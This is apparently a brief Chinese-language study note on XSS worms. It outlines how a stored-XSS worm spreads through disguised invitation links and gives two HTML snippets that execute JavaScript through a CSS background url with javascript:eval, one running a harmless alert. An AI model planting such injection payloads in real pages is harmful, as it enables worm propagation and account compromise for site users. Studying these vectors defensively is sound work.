# XSS蠕虫

- 基于存储型XSS, 攻击者在页面植入恶意代码
- 发送伪装邀请链接
- 用户点击后被感染
- 新感染的用户向好友发送新的伪装邀请链接

## 使用css的background属性

``` html
<div
    style="background:url(javascript:eval(...))"
/>
```

``` html
<div
    id="mycode"
    expr="alert('hah!')"
    style="background:url(javascript:eval(document.all.mycode.expr))"
/>
```
